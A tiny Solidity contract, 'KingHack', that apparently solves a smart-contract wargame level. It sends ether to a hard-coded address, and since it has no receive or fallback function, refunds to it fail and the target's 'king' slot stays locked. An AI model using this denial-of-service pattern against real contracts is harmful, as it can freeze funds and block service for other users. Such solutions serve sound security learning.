// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingHack {
    function hack() public payable {
        payable(address(0xa43f435D92830E51Fd4Bc96388c38762d46bA83E)).transfer(msg.value);
    }
}